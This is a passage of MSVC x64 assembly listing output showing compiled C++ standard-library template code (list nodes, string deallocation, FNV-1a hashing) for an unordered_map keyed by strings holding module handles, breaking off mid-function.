;	COMDAT ??$forward@M@std@@YA$$QEAMAEAM@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@M@std@@YA$$QEAMAEAM@Z PROC			; std::forward<float>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@M@std@@YA$$QEAMAEAM@Z ENDP			; std::forward<float>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@PEADAEAPEAD$0A@@std@@YAPEAPEADQEAPEADAEAPEAD@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@PEADAEAPEAD$0A@@std@@YAPEAPEADQEAPEADAEAPEAD@Z PROC ; std::construct_at<char *,char * &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@PEADAEAPEAD$0A@@std@@YAPEAPEADQEAPEADAEAPEAD@Z ENDP ; std::construct_at<char *,char * &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Adl_verify_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
??$_Adl_verify_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0@Z PROC ; std::_Adl_verify_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>, COMDAT

; 1278 :     // check that [_First, _Last) forms an iterator range
; 1279 :     if constexpr (is_pointer_v<_Iter> && is_pointer_v<_Sentinel>) {
; 1280 : #if _ITERATOR_DEBUG_LEVEL != 0
; 1281 :         _STL_VERIFY(_First <= _Last, "transposed pointer range");
; 1282 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 1283 :     } else if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1284 :         _Verify_range(_First, _Last);
; 1285 :     }
; 1286 : }

	ret	0
??$_Adl_verify_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0@Z ENDP ; std::_Adl_verify_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Emplace_back@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
<_Vals_0>$ = 16
??$_Emplace_back@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z PROC ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Emplace_back<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>, COMDAT

; 1596 :         // construct a new element at *_Last and increment
; 1597 :         _STD _Construct_in_place(*_Last, _STD forward<_Types>(_Vals)...);

	mov	r8, QWORD PTR [rcx+8]
	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [r8], rax

; 1598 :         ++_Last;

	add	QWORD PTR [rcx+8], 8

; 1599 :     }

	ret	0
??$_Emplace_back@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z ENDP ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Emplace_back<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z PROC ; std::addressof<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z ENDP ; std::addressof<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z PROC ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z ENDP ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEAPEAU10@@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEAPEAU10@@Z PROC ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEAPEAU10@@Z ENDP ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@$$CBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@$$CBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEBV10@@Z PROC ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > const >, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@$$CBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEBV10@@Z ENDP ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > const >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$_Hash_array_representation@D@std@@YA_KQEBD_K@Z
_TEXT	SEGMENT
_First$ = 8
_Count$ = 16
??$_Hash_array_representation@D@std@@YA_KQEBD_K@Z PROC	; std::_Hash_array_representation<char>, COMDAT

; 2332 :     static_assert(is_trivial_v<_Kty>, "Only trivial types can be directly hashed.");
; 2333 :     return _Fnv1a_append_bytes(

	xor	r9d, r9d
	mov	rax, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	rdx, rdx
	je	SHORT $LN16@Hash_array
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	4
$LL12@Hash_array:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	r8d, BYTE PTR [rcx+r9]
	inc	r9
	xor	rax, r8

; 2302 :         _Val *= _FNV_prime;

	imul	rax, r10
	cmp	r9, rdx
	jb	SHORT $LL12@Hash_array
$LN16@Hash_array:

; 2334 :         _FNV_offset_basis, reinterpret_cast<const unsigned char*>(_First), _Count * sizeof(_Kty));
; 2335 : }

	ret	0
??$_Hash_array_representation@D@std@@YA_KQEBD_K@Z ENDP	; std::_Hash_array_representation<char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??1?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ PROC ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 588  :     ~_List_node_emplace_op2() {

$LN93:
	mov	QWORD PTR [rsp+16], rbx
	push	rdi
	sub	rsp, 32					; 00000020H

; 589  :         if (this->_Ptr != pointer{}) {

	mov	rbx, QWORD PTR [rcx+8]
	mov	rdi, rcx
	test	rbx, rbx
	je	SHORT $LN11@List_node_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN36@List_node_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN50@List_node_

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN47@List_node_

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN50@List_node_:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN36@List_node_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
$LN11@List_node_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1137 :         if (_Ptr) {

	mov	rcx, QWORD PTR [rdi+8]
	test	rcx, rcx
	je	SHORT $LN67@List_node_

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	call	??3@YAXPEAX_K@Z				; operator delete
$LN67@List_node_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 592  :     }

	mov	rbx, QWORD PTR [rsp+56]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN47@List_node_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN90@List_node_:
??1?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ENDP ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Release@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@XZ PROC ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Release, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 756  :     _Ty _Old_val = static_cast<_Ty&&>(_Val);

	mov	rax, QWORD PTR [rcx+8]

; 757  :     _Val         = static_cast<_Other&&>(_New_val);

	mov	QWORD PTR [rcx+8], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1129 :     }

	ret	0
?_Release@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@XZ ENDP ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >, COMDAT

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	QWORD PTR [rcx+16], rax
	mov	rax, rcx
	ret	0
??0?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Rehash_for_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXXZ
_TEXT	SEGMENT
this$dead$ = 48
